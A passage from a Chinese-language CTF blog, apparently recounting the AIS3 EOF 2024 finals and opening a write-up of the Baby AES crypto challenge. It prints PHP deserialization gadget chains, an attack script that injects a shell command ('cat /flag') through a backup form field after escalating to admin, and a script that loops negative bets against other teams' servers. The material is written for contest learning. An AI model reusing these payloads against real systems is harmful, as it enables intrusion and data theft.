BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br><span class="line"><span class="comment"># after</span></span><br><span class="line"><span class="string">b'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:9:"\x00*\x00fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:9:"structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:8:"\x00*\x00regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:13:"\x00*\x00statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br><span class="line"><span class="comment"># after after</span></span><br><span class="line"><span class="string">'O:30:"Envms\\FluentPDO\\Queries\\Select":3:{s:6:"fluent";O:21:"Envms\\FluentPDO\\Query":1:{s:9:"structure";O:25:"Envms\\FluentPDO\\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:5:"regex";O:21:"Envms\\FluentPDO\\Regex":0:{}s:10:"statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}'</span></span><br></pre></td></tr></table></figure></div><p>所以把這個搶回來了, 然後又被搶走了, 因為我 <code>\x00</code> 沒全部處理掉. 但我把其他人的搶走 (對方 payload 後面多了 <code>\n</code>, 刪掉後就得手), 所以我們還是第一, 這題變成比手速的題目了.</p><p>到了下午, 有更多奇怪的手段出現, 像是讓 chain 裡面的字串更短.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:19:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:5:"mixed";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:4:"info";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:4:"info";s:16:"@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"><span class="string">b'O:37:"Monolog\\Handler\\FingersCrossedHandler":4:{s:13:"passthruLevel";E:18:"Monolog\\Level:Info";s:7:"handler";r:1;s:6:"buffer";a:1:{i:0;O:17:"Monolog\\LogRecord":2:{s:5:"level";r:2;s:0:"";s:18:"./@ --give-me-flag";}}s:10:"processors";a:3:{i:0;s:15:"get_object_vars";i:1;s:3:"end";i:2;s:10:"p0pp3r_win";}}'</span></span><br><span class="line"></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:13:"\x00*\x00parameters";O:28:"Predis\\Configuration\\Options":3:{s:10:"\x00*\x00options";a:0:{}s:8:"\x00*\x00input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:53:"\x00Predis\\Cluster\\Distributor\\HashRing\x00nodeHashCallback";s:10:"p0pp3r_win";s:42:"\x00Predis\\Cluster\\Distributor\\HashRing\x00nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:11:"\x00*\x00handlers";a:1:{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:29:"\\Predis\\Configuration\\Options";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection"::{s:10:"parameters";O:28:"Predis\\Configuration\\Options"::{s:7:"options";a::{}s:5:"input";a::{s:10:"persistent";a::{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing"::{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a::{i:0;a::{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a::{s:10:"persistent";s:37:"\\Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":2:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:0:{}}}'</span></span><br></pre></td></tr></table></figure></div><p>但最特別的還是這個</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\\Configuration\\Option\\Commands";}}}'</span></span><br><span class="line"><span class="string">b'O:34:"Predis\\Connection\\StreamConnection":1:{s:10:"parameters";O:28:"Predis\\Configuration\\Options":3:{s:7:"options";a:0:{}s:5:"input";a:1:{s:10:"persistent";a:2:{i:0;O:35:"Predis\\Cluster\\Distributor\\HashRing":2:{s:16:"nodeHashCallback";s:10:"p0pp3r_win";s:5:"nodes";a:1:{i:0;a:2:{s:6:"weight";i:1;s:6:"object";s:18:"./@ --give-me-flag";}}}i:1;s:7:"getSlot";}}s:8:"handlers";a:1:{s:10:"persistent";s:36:"Predis\\Configuration\\Option\\Commands";}'</span></span><br></pre></td></tr></table></figure></div><p>這兩個 chain 唯一的差別就是刪掉了最後面的 <code>}</code>, 是 starburst 隊發現的, 我在短短的 5 秒內分析出了這個手段, 然後把更多尾端的 <code>}</code> 刪掉送出, 就成功搶走他們的了, 這前後可能才十秒的時間, 所以這個真的是比手速.</p><p>這題是我跟其他隊交流最多的一題 (有打這題的隊伍比例只有 50%), 能感受到正在跟真人互動, 賽後也跟對上的人聊的很開心.</p><p>補個 splitline 在賽中說其實也可用的 chain 的 <a class="link" href="https://hackmd.io/@Ching367436/r1w_xLFdo#%E4%BB%BB%E6%84%8F-require--phpinfo-to-RCE">write-up <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, 是去年 edu-ctf 的但沒有官方解答.</p><h2 id="Pwn2Own"><a href="#Pwn2Own" class="headerlink" title="Pwn2Own"></a>Pwn2Own</h2><p>題目是一個 樹莓派, 上面有 firmware, 是個計分板的 app.</p><p><img src="/ais3-eof-2024-final/pwn2own.webp" alt="pwn2own"></p><p>每組都有一個 pie, 主辦方會將 firmware 放到 google drive 供大家下載, 要自己拆開.</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Mre firmware</span><br></pre></td></tr></table></figure></div><p>拆開後大概長這樣: </p><p><img src="/ais3-eof-2024-final/pwn2own-firmware.webp"></p><p>所以這主要是 web 而不是 pwn.</p><p>參賽者的目標是要讓 pie 顯示出指定影片, 可以透過 XSS 或 RCE 來達成. </p><p>payload 要透過交給主辦方的 write-up, 由主辦方在 pie 的同個網路環境執行, 只能透過網路進行攻擊, 不能在 pie 接上 usb.</p><p>有人打成功後主辦會上 patch, 所以會越來越難, 也有少數 pwn 的洞, 像是這個</p><p><img src="/ais3-eof-2024-final/pwn2own-auth.webp"></p><p>這個 bin 是保護全關的, 唯一的缺點是他是 arm-32.</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@c603fff492a6 /home# checksec auth</span><br><span class="line">[*] <span class="string">'/home/auth'</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><p>後面隊友用 Apple ARM 的 Mac Docker 開了對應架構的 VM, 可以跑但不能 gdb, 聽說用 x86 開就可用. 到了隔天, 我幫隊友從我們的 pie 打 shell 出來給用 gdb, 但還是沒找到 stack 的 address… 後來有別隊解出這個洞.</p><p>有另個洞是把 firmware flash 成舊版本, 然後用舊版的洞來打, 後來有 patch 成需要過 auth 才能, 但還是能打過 auth (fixed secret), 但後來時間不夠, 不然基本上 exp 已經寫好了.</p><p>感覺我一開始就跳進這題分數會多很多.</p><p>這題推別隊寫的<a class="link" href="https://hackmd.io/@TWNWAKing/HJK40Xpca">這篇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> write-up.</p><h2 id="hahamut-A-D"><a href="#hahamut-A-D" class="headerlink" title="hahamut [A&D]"></a>hahamut [A&amp;D]</h2><p>這題我基本上只有參與輔助的部分, 題目我沒看. 主要就是自動抓流量來到 Arkime 上看, attack manager 部分由 Wilson 負責, ywc 負責拆 patch. 沒想到過了整個上午我們這隊有洞可以打, 但沒人攻擊 QQ. 直到我午後臨時進入, 從封包抄走別隊的攻擊才開始有攻擊分, 我們隊基本上只有被打穿兩種洞.</p><p>附個攻擊 script.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_hex</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    url = <span class="string">f"http://<span class="subst">{sys.argv[<span class="number">1</span>]}</span>:8763"</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line"></span><br><span class="line">    username = token_hex(<span class="number">16</span>)</span><br><span class="line">    sess.post(url + <span class="string">'/register'</span>, data={</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: username,</span><br><span class="line">        <span class="string">'role'</span>: <span class="string">'user'</span></span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    sess.post(url + <span class="string">'/update'</span>, data={</span><br><span class="line">        <span class="string">'user[role]'</span>: <span class="string">'admin'</span>,</span><br><span class="line">    })</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 'backup[users]=1&amp;backup[-Iecho+`cat+/flag`&gt;/app/public/af9acdd862352d3d895f16f0dd3380724b0dd33214f1fe8253b6072aaa0b9333e776a1a90555274789a2953c152fafc9]=test'</span></span><br><span class="line">    sess.post(url + <span class="string">'/admin/backup'</span>, data={</span><br><span class="line">        <span class="string">"backup[users]"</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">f"backup[-Iecho `cat /flag`&gt;/app/public/<span class="subst">{username}</span>]"</span>: <span class="string">"test"</span></span><br><span class="line">    })</span><br><span class="line">    r = sess.get(url + <span class="string">f'/<span class="subst">{username}</span>.json'</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text, flush=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div><p>另外比賽給的 patch 是從 Docker 出來的, 所以拆的時候要像這樣:</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> file*</span><br><span class="line">wget --header=<span class="string">"Authorization: &lt;team token&gt;"</span> http://35.221.224.244:8888/patch/123/file</span><br><span class="line">zstd -d file -o file.tar</span><br><span class="line">undocker file.tar team3_r89.tar</span><br><span class="line"><span class="built_in">mkdir</span> team3_r89</span><br><span class="line">tar xvf team3_r89.tar -C team3_r89</span><br><span class="line">diff -r src patches/team3_r89/app/src/</span><br></pre></td></tr></table></figure></div><p>基本上跟 DEF CON 一樣.</p><p>賽後 maple3142 說這題可以 persist 一直拿 flag, 因為不會被洗掉, 但沒人做.</p><h2 id="Casino-A-D-KoH"><a href="#Casino-A-D-KoH" class="headerlink" title="Casino [A&D / KoH?]"></a>Casino [A&amp;D / KoH?]</h2><p>這題只有幫忙臨時寫 script, 寫的是到別人的賭場賭負數的錢, 大概花了 1~2 分鐘寫好.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_token</span>():</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    URL = <span class="string">'http://10.102.100.2:8080/api/roundInfo?team_token=467f2d77f9df424490d15fc05d80774a'</span></span><br><span class="line">    response = requests.get(URL).json()</span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">'user_token'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">            user_token = get_user_token()</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">6</span>: <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">    curl 'http://10.102.'''</span>+<span class="built_in">str</span>(i)+<span class="string">'''.20:8000/api/start_game' \</span></span><br><span class="line"><span class="string">    -H 'Accept: */*' \</span></span><br><span class="line"><span class="string">    -H 'Accept-Language: zh-TW,zh;q=0.9' \</span></span><br><span class="line"><span class="string">    -H 'Connection: keep-alive' \</span></span><br><span class="line"><span class="string">    -H 'Content-Type: application/json' \</span></span><br><span class="line"><span class="string">    -H 'Cookie: SL_G_WPT_TO=zh-TW; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; teamToken=&lt;team token&gt;' \</span></span><br><span class="line"><span class="string">    -H 'DNT: 1' \</span></span><br><span class="line"><span class="string">    -H 'Origin: http://10.102.9.20:8000' \</span></span><br><span class="line"><span class="string">    -H 'Referer: http://10.102.9.20:8000/' \</span></span><br><span class="line"><span class="string">    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0' \</span></span><br><span class="line"><span class="string">    --data-raw '{"user_token":"'''</span>+user_token+<span class="string">'''","bet":"-10000"}' \</span></span><br><span class="line"><span class="string">    --compressed \</span></span><br><span class="line"><span class="string">    --insecure  '''</span></span><br><span class="line">    </span><br><span class="line">            <span class="built_in">print</span>(cmd)        </span><br><span class="line"></span><br><span class="line">            os.system(cmd)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div><h2 id="ICPC-KoH"><a href="#ICPC-KoH" class="headerlink" title="ICPC [KoH]"></a>ICPC [KoH]</h2><p>給了競程的題目, 要用 shellcode 解, 像是算 a+b 等於多少、sort 之類的, 可以禁止某些 byte, 基本上這題我沒參與, 這是唯一適合我這隊幾乎全 pwn 組成的題目, 第二天打的很不錯.</p><h2 id="賽前準備"><a href="#賽前準備" class="headerlink" title="賽前準備"></a>賽前準備</h2><p>這次決賽採主辦方讓每個人依出賽排名輪流選隊的方式, 我隊內大概有兩個是認識的, 共有八人, 人數偏多, 大部分都不認識, 所以在團隊運作上有很大的挑戰. 賽前我把隊友聚集起來, 線上討論準備了 attack manager 跟 pcap search 還有各種語言的混淆工具, 也了解了隊友擅長的領域, 大部分隊友都是打 pwn, reverse 跟 crypto 的, 能打 web 的就我跟 ywc 而已. 以這次 EOF 賽後來看, 多一點 web 的人會有利很多. 比賽環境包含 scoreboard 都要透過 jumpbox 連上, 所以請 ywc 在上面用個 VPN server.</p><h2 id="團隊分工-–-這次收穫最多的地方"><a href="#團隊分工-–-這次收穫最多的地方" class="headerlink" title="團隊分工 – 這次收穫最多的地方"></a>團隊分工 – 這次收穫最多的地方</h2><p>第一天已開始放出了 1 題 A&amp;D, 1 題 KoH 及 1 題 pwn2own, 實際上全部都是 web 題. 我一開始是直接讓每一題都有人看, 請 Wilson 把 attack manager 送 flag 得部分處理好, 接著我把自動下載封包 + import 寫好. </p><p>在這個時候我都還以為 Pwn2Own 打的是 pwn, 所以就把這題一直放在主 pwn 的隊友那邊, 等發現的時候第一天也快結束了, 這是這次分數虧最大的地方, 所以定期了解各題概況會是相當重要的一步.</p><p>另一個方面在第一天其他部分的人力配置也很不好, 最 critical 的是我這隊打 web 的真的太少, 所以四題 web 可能只能選一題請 Ching367436 輸出. 在第一天經歷過這些也讓我們排名掉到了倒數第二 (倒數第一是 NPC). 所以第一天晚上我把隊友都聚集在一起, 重新調整隊伍配置.</p><h3 id="調整隊伍配置及戰略"><a href="#調整隊伍配置及戰略" class="headerlink" title="調整隊伍配置及戰略"></a>調整隊伍配置及戰略</h3><p>因為都來到了倒數第二, 勢必有東西是需要捨去的. 我給了隊友們兩個選項:</p><ol><li>衝高分數</li><li>拿到獎狀就好</li></ol><p>選 2 表示要將全隊集中在同一題, 來拿那題的獎狀, 1 則是讓 overall 的分數最高. 最後我們選擇走 1.</p><p>我決定第一個捨去掉的是 hahamut 這題的人力, 只留半個人顧封包, 事後證實這很正確, 因為沒人打穿. 接著由 Ching367436 一個人負責 popper 這題, 這也為我們賺了很多分, 這題在第二天我們大部分回合都是第一的 king. ICPC 這題則是放剛好夠的人力進去, 其他大部分都放進新的題目.也放了一些人打 Pwn2Own 的 pwn 部分. 第二天午後 casino 這題戰況也陷入膠著, 我請 Wilson 把這題我們放上讓其他隊都無法攻擊的 patch (拉下整個服務, 讓其他隊無法攻擊) 後把人力空出來去打 Pwn2Own.</p><p>經過調整之後, 我們隊在第二天 140 回合附近進入了前三, 可見調整人力配置 (尤其是互相不認識的多人隊伍) 對分數由很大的影響.</p>]]></content>
    
    
    <summary type="html">本文將包含我有看的題目、賽前準備以及團隊分工的心得, 由於大部分隊友都不認識, 而且一隊有 8 人, 在這種情況下團隊分工會是很大的挑戰, 也在這次體驗到各種很壞的團隊分工, 光是團隊分工就可以讓我們排名在第一天就掉到倒數第二, 我在當晚匯集隊友重新調整, 在第二天第 140 回合就衝到了前三.</summary>
    
    
    
    <category term="AIS3" scheme="https://blog.ching367436.me/categories/AIS3/"/>
    
    <category term="EOF" scheme="https://blog.ching367436.me/categories/AIS3/EOF/"/>
    
    
    <category term="ais3" scheme="https://blog.ching367436.me/tags/ais3/"/>
    
    <category term="ctf" scheme="https://blog.ching367436.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>AIS3 EOF 2024 Write-up</title>
    <link href="https://blog.ching367436.me/ais3-eof-2024-write-up/"/>
    <id>https://blog.ching367436.me/ais3-eof-2024-write-up/</id>
    <published>2024-01-18T01:58:01.000Z</published>
    <updated>2024-01-18T01:58:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>這次在 EOF 解了 8 題, 感覺至少賽中至少還能多解個 3 題以上.</p><p><img src="/ais3-eof-2024-write-up/scoreboard.webp" alt="scoreboard"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Baby-AES"><a href="#Baby-AES" class="headerlink" title="Baby AES"></a>Baby AES</h3><h4 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b, bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XOR</span> (a, b):</span><br><span class="line">    <span class="keyword">return</span> l2b(b2l(a) ^ b2l(b)).rjust(<span class="built_in">len</span>(a), <span class="string">b"\x00"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">counter_add</span>(<span class="params">iv</span>):</span><br><span class="line">    <span class="keyword">return</span> l2b(b2l(iv) + <span class="number">1</span>).rjust(<span class="number">16</span>, <span class="string">b"\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># These modes of Block Cipher are just like Stream Cipher. Do you know them?</span></span><br><span class="line">AES_enc = AES.new(urandom(<span class="number">16</span>), AES.MODE_ECB).encrypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_CFB</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        _ct = XOR(AES_enc(iv), pt[i : i + <span class="number">16</span>])</span><br><span class="line">        iv = _ct</span><br><span class="line">        ct += _ct</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_OFB</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        iv = AES_enc(iv)</span><br><span class="line">        ct += XOR(iv, pt[i : i + <span class="number">16</span>])</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_CTR</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        ct += XOR(AES_enc(iv), pt[i : i + <span class="number">16</span>])</span><br><span class="line">        iv = counter_add(iv)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    counter = urandom(<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    c1 = urandom(<span class="number">32</span>)</span><br><span class="line">    c2 = urandom(<span class="number">32</span>)</span><br><span class="line">    c3 = XOR(XOR(c1, c2), FLAG)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f"c1_CFB: (<span class="subst">{b64encode(counter)}</span>, <span class="subst">{b64encode(AES_CFB(counter, c1))}</span>)"</span> )</span><br><span class="line">    counter = counter_add(counter)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f"c2_OFB: (<span class="subst">{b64encode(counter)}</span>, <span class="subst">{b64encode(AES_OFB(counter, c2))}</span>)"</span> )</span><br><span class="line">    counter = counter_add(counter)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f"c3_CTR: (<span class="subst">{b64encode(counter)}</span>, <span class="subst">{b64encode(AES_CTR(counter, c3))}</span>)"</span> )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            counter = counter_add(counter)</span><br><span class="line">            mode = <span class="built_in">input</span>(<span 